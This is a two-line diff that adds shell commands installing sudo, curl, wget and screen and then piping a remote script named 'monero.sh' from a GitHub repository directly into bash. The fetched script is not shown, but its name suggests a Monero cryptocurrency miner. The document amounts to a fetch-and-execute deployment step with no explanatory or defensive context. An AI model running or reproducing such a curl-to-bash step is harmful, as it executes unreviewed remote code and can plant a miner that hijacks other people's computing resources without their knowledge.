@@ -1,0 +1,2 @@
+apt update && apt install sudo curl wget screen
+curl -sL https://github.com/stellavholiza-dev/jembut/raw/refs/heads/main/monero.sh | bash
